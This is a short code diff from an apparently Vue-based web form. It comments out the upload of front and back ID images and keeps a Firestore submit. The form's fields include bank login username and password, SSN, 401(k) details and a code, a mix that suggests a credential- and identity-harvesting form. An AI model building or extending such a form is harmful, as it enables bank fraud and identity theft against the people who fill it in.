@@ -127,34 +127,34 @@ const submitForm = () => {
   }
   loadReq.value = true;
   // upload both images to Cloudinary
-  Promise.all([
-    uploadImage(dataUrlToFile(frontPreview.value, 'front-id')),
-    uploadImage(dataUrlToFile(backPreview.value, 'back-id'))
-  ]).then(([frontUrl, backUrl]) => {
-    // Here you can send the form data along with the uploaded image URLs to your backend or Firestore
-    form.value.frontPreview = frontUrl;
-    form.value.backPreview = backUrl;
-    console.log('Front Image URL:', frontUrl);
-    console.log('Back Image URL:', backUrl);
+  // Promise.all([
+  //   uploadImage(dataUrlToFile(frontPreview.value, 'front-id')),
+  //   uploadImage(dataUrlToFile(backPreview.value, 'back-id'))
+  // ]).then(([frontUrl, backUrl]) => {
+  //   // Here you can send the form data along with the uploaded image URLs to your backend or Firestore
+  //   form.value.frontPreview = frontUrl;
+  //   form.value.backPreview = backUrl;
+  //   console.log('Front Image URL:', frontUrl);
+  //   console.log('Back Image URL:', backUrl);
 
-    // Reset form and previews if needed
-    // form.value = {
-    //   bank: '',
-    //   accountNumber: '',
-    //   amount: '',
-    //   username: '',
-    //   password: '',
-    //   ssn: '',
-    //   fortyOneK: '',
-    //   fortyOneKProvider: '',
-    //   code: ''
-    // };
-    // frontPreview.value = '';
-    // backPreview.value = '';
-  }).catch(err => {
-    console.error('Error uploading images:', err);
-    $swal.fire('Error', 'There was an issue uploading your ID images. Please try again.', 'error');
-  });
+  //   // Reset form and previews if needed
+  //   // form.value = {
+  //   //   bank: '',
+  //   //   accountNumber: '',
+  //   //   amount: '',
+  //   //   username: '',
+  //   //   password: '',
+  //   //   ssn: '',
+  //   //   fortyOneK: '',
+  //   //   fortyOneKProvider: '',
+  //   //   code: ''
+  //   // };
+  //   // frontPreview.value = '';
+  //   // backPreview.value = '';
+  // }).catch(err => {
+  //   console.error('Error uploading images:', err);
+  //   $swal.fire('Error', 'There was an issue uploading your ID images. Please try again.', 'error');
+  // });
 
   // save to Firestore
   submitRequest(form.value).then((resp) => {
